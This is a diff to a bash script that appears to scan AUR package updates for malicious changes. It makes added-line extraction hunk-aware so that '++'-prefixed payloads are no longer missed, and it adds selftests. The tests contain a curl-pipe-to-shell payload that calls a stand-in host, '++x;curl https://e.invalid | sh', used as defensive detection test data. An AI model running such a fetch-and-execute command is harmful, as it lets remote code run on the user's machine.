@@ -304,15 +304,29 @@ find_pkg_dir() {
   return 1
 }
 
-# Emit only ADDED lines from a git diff (leading '+' stripped, '+++' headers
-# skipped). Binary blobs and nested patch files are excluded from deterministic
-# scanning (see EXCLUDE_PATHS); review stashes use the wider evidence set.
-# Assert git diff exit code: with pipefail, a pipeline masks git's failure
-# behind sed — capture first (finding C).
+# Extract ADDED lines from a unified diff on stdin: strip the single leading
+# '+' from lines INSIDE a hunk only. The '+++ b/file' header lives in the
+# preamble (before any '@@'), so it is never emitted — but an added line whose
+# content begins with '++' (rendered '+++…' in the diff) IS kept. Hunk-aware
+# because '+++ b/file' and added content '++ b/file' are textually identical;
+# only hunk position tells them apart (Finding gh2 / issue #2).
+_diff_added_lines() {
+  awk '
+    /^@@/    { in_hunk = 1; next }
+    /^diff / { in_hunk = 0; next }
+    in_hunk && /^\+/ { sub(/^\+/, ""); print }
+  '
+}
+
+# Emit only ADDED lines from a git diff via _diff_added_lines (above). Binary
+# blobs and nested patch files are excluded from deterministic scanning (see
+# EXCLUDE_PATHS); review stashes use the wider evidence set. Assert git diff
+# exit code: with pipefail, a pipeline masks git's failure behind awk — capture
+# first (finding C).
 diff_added() {
   local diff_out
   diff_out=$(git --no-pager diff --no-textconv "$@" -- "${EXCLUDE_PATHS[@]}" 2>/dev/null) || return 1
-  sed -n '/^+++/!s/^+//p' <<<"$diff_out"
+  _diff_added_lines <<<"$diff_out"
 }
 
 # File-aware metadata extraction. `diff_added` intentionally serves broad
@@ -325,7 +339,7 @@ _diff_added_metadata_file() {
   local dir="$1" base_ref="$2" path="$3" diff_out
   diff_out=$(git -C "$dir" --no-pager diff --text --no-textconv \
     "${base_ref}..origin/${AUR_REMOTE_BRANCH}" -- "$path" 2>/dev/null) || return 1
-  sed -n '/^+++/!s/^+//p' <<<"$diff_out"
+  _diff_added_lines <<<"$diff_out"
 }
 
 _blob_is_nul_free() {
@@ -3708,6 +3722,44 @@ cmd_selftest() {
   STATE_DIR="$_df_sd"; ACCEPTED_DIR="$_df_ad"; STAGED_DIR="$_df_st"; MANIFEST_FILE="$_df_mf"
   _AUR_TEST_DIR=""
   rm -rf "$_dfx" "$_dfs"
+
+  # Finding gh2 / issue #2: added-line extractor must be hunk-aware. A line
+  # whose content begins with '++' renders as '+++…' in the diff; the old
+  # sed '/^+++/!…' dropped it, hiding payloads like '++x;curl …| sh' from
+  # every rule. The '+++ b/file' header (textually identical to added '++
+  # b/file') must never be emitted; ++-prefixed content inside a hunk is kept.
+  local _gh2_out
+  _gh2_out=$(printf '%s\n' \
+    'diff --git a/PKGBUILD b/PKGBUILD' '--- a/PKGBUILD' '+++ b/PKGBUILD' \
+    '@@ -1,2 +1,4 @@' ' pkgname=x' '+clean line' '+++x;curl https://e.invalid | sh' \
+    'diff --git a/y.install b/y.install' '--- /dev/null' '+++ b/y.install' \
+    '@@ -0,0 +1 @@' '+++second-file-payload' | _diff_added_lines)
+  if printf '%s' "$_gh2_out" | grep -qxF 'clean line' \
+    && printf '%s' "$_gh2_out" | grep -qxF '++x;curl https://e.invalid | sh' \
+    && printf '%s' "$_gh2_out" | grep -qxF '++second-file-payload' \
+    && ! printf '%s' "$_gh2_out" | grep -qxF ' pkgname=x' \
+    && ! printf '%s' "$_gh2_out" | grep -qF 'b/PKGBUILD' \
+    && ! printf '%s' "$_gh2_out" | grep -qF 'b/y.install'; then
+    log "  $(c_green "PASS") diff-added-hunk-aware-plusplus-content"; pass=$((pass+1))
+  else
+    log "  $(c_red "FAIL") diff-added-hunk-aware-plusplus-content"; fail=$((fail+1))
+  fi
+  # End-to-end: a real git diff whose added PKGBUILD line starts with '++' must
+  # still trip the hard curl|sh rule. Before the fix diff_added dropped it and
+  # scan_diff_rules returned clean (0).
+  local _gh2x _gh2base
+  _gh2x=$(mktemp -d)
+  mkdir -p "$_gh2x/src/c1-pkg"
+  printf 'pkgname=c1-pkg\npkgver=1\npkgrel=1\n' >"$_gh2x/src/c1-pkg/PKGBUILD"
+  git -C "$_gh2x/src/c1-pkg" -c init.defaultBranch=master init -q
+  git -C "$_gh2x/src/c1-pkg" -c user.email=t@t -c user.name=t commit -qm base
+  _gh2base=$(git -C "$_gh2x/src/c1-pkg" rev-parse HEAD)
+  printf '++x;curl https://e.invalid | sh\n' >>"$_gh2x/src/c1-pkg/PKGBUILD"
+  git -C "$_gh2x/src/c1-pkg" add -A; git -C "$_gh2x/src/c1-pkg" commit -qm v2
+  git -C "$_gh2x/src/c1-pkg" remote add origin "file://$_gh2x/src/c1-pkg"
+  git -C "$_gh2x/src/c1-pkg" update-ref refs/remotes/origin/master HEAD
+  ta "plusplus-payload-blocks" 1 scan_diff_rules c1-pkg "$_gh2x/src/c1-pkg" "$_gh2base"
+  rm -rf "$_gh2x"
 
   # Finding J: the script exports GIT_CONFIG_GLOBAL/SYSTEM=/dev/null at load
   # time (see top of file), isolating all git calls from user config. Two-part
